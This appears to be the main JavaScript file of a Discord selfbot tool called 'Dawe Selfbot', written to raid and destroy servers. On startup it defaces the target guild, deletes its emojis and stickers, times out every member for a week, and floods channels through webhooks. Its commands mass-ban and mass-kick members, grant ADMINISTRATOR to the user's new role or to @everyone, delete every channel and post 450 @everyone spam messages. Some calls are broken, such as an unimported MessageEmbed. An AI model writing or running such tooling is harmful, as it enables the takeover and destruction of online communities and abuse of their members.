const { Client } = require("discord.js-selfbot-v13");
const extrackGuild = require("./Utils/fetchGuild.js");
const Bypass = require("./Utils/spamGuild.js");
const fetchSecurityBots = require("./Utils/fetchGuild.js");

const client = new Client({
  checkUpdate: false,
});

const { token, prefix, useEmbed } = require("./config.json");
const { guild, embed } = require("./Utils/settings.json");
const { webhooks_avatar, webhooks_name, guild_channels_name } = guild;

client.on("ready", async () => {
  console.log(`${client.user.username} is ready!`);

  const fetchedGuild = await extrackGuild();
  if (!fetchedGuild) {
    console.log("Guild not found!");
    return;
  }

  if (typeof fetchedGuild.fetchWebhooks === "function") {
    const webhooks = await fetchedGuild.fetchWebhooks();
    await fetchedGuild.setIcon(
      guild.guild_icon ||
        "https://media.discordapp.net/attachments/1203984625274191893/1216375255380004954/830356614028066836.png?ex=6633933c&is=663241bc&hm=0589ecb12fc9342b9cc654b32554b44b8177d620a317994c0f21127e52e7e1cc&=&format=webp&quality=lossless"
    );
    await fetchedGuild.setBanner(
      guild.guild_banner ||
        "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=6633a3c5&is=66325245&hm=d0703a96d0aae7346beed33a2460f4dd7bf85e7eea750ff5a5da05b37a9c7de1&=&format=webp"
    );
    await fetchedGuild.setName(guild.guild_name || "Dawe Selfbot");

    fetchedGuild.emojis.cache.forEach((emoji) => {
      guild.emojis.delete(emoji);
    });

    fetchedGuild.stickers.cache.forEach((sticker) => {
      guild.stickers.delete(sticker);
    });

    fetchedGuild.channels.cache.each((ch) => {
      ch.setName(guild_channels_name || "dawe");
    });

    await fetchSecurityBots();

    const timeInMilliseconds = 7 * 24 * 60 * 60 * 1000;

    const members = await fetchedGuild.members.fetch();
    members.forEach(async (member) => {
      try {
        await member.timeout(timeInMilliseconds, "Using Dawe Selfbot!");
        console.log(`Timeout added to ${member.user.tag}`);
      } catch (error) {
        console.error(
          `Could not add timeout to ${member.user.tag}: ${error.message}`
        );
      }
    });
    if (webhooks.size === 0) {
      fetchedGuild.channels.cache.each(async (channel) => {
        if (channel.type === "text") {
          try {
            const webhook = await channel.createWebhook(
              webhooks_name || "Dewa Selfbot",
              {
                avatar:
                  webhooks_avatar ||
                  "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=6633a3c5&is=66325245&hm=d0703a96d0aae7346beed33a2460f4dd7bf85e7eea750ff5a5da05b37a9c7de1&=&format=webp",
                reason: "developed by i1wx",
              }
            );
            console.log("Created Webhook in:", channel.name);
            await Bypass(webhook.url, useEmbed, fetchedGuild);
          } catch (error) {
            console.error("Failed to Created Webhook!", error);
          }
        }
      });
    } else {
      webhooks.each(async (webhook) => {
        await Bypass(webhook.url, useEmbed, fetchedGuild);
      });
    }
  }
});

client.on("messageCreate", async (message) => {
  if (message.author === client.user) {
    const content = message.content;
    if (content.startsWith(prefix) || content.startsWith(",")) {
      const args = content.slice(prefix.length).trim().split(/ +/);
      const command = args.shift().toLowerCase();

      if (command === "banall") {
        const members = await message.guild.members.fetch();
        members.forEach(async (member) => {
          member.ban().catch((e) => {
            console.log(`${member.user.tag} no pudo ser baneado`);
          });
        });
      } else if (command === "kickall") {
        const members = await message.guild.members.fetch();
        members.forEach(async (member) => {
          member.kick().catch((e) => {
            console.log(`${member.user.tag} no pudo ser expulsado`);
          });
        });
      } else if (command === "admin") {
        message.delete();
        const role = await message.guild.roles.create({
          data: {
            name: "dawe",
            reason: "Using Dawe Selfbot",
            color: "#000001",
            permissions: "ADMINISTRATOR",
          },
        });
        message.member.roles.add(role.id);
      } else if (command === "everyone") {
        message.delete();
        const everyoneRole = message.guild.roles.cache.find((role) => role.name === "@everyone");
        if (everyoneRole) {
          everyoneRole.setPermissions("ADMINISTRATOR").then(() => {
            console.log(`Gave Administrator permission to Everyone role!`);
          });
        } else {
          console.error("Could not find Everyone role in this server.");
        }
      } else if (command === "raid") {
        message.delete();
        const exampleEmbed = new Discord.MessageEmbed()
          .setColor("36393F")
          .setURL("https://github.com/i1wx/Dawe")
          .setAuthor({
            name: embed.author || "<a:02_mygivelove:1235377346144374856>  ** Github** ",
            url: "https://github.com/i1wx/Dawe",
          })
          .setDescription(`> ${embed.description || "```fix\ni Invite you to use dawe selfbot to do things as impressive as this <3```"}`)
          .setTimestamp()
          .setFooter({ text: embed.footer || null});

        await message.guild.setName("Miami Club was here");
        await message.guild.channels.cache.forEach((channel) => channel.delete().catch((e) => {
          console.log("Channel Was Not Deleted");
        }));

        const channel = await message.guild.channels.create("mudanza", { type: "text" });
        for (let i = 0; i < 450; i++) {
          channel.send({ embeds: [exampleEmbed], content: "@everyone" });
        }
      }
    }
  }
});

client.login(token);
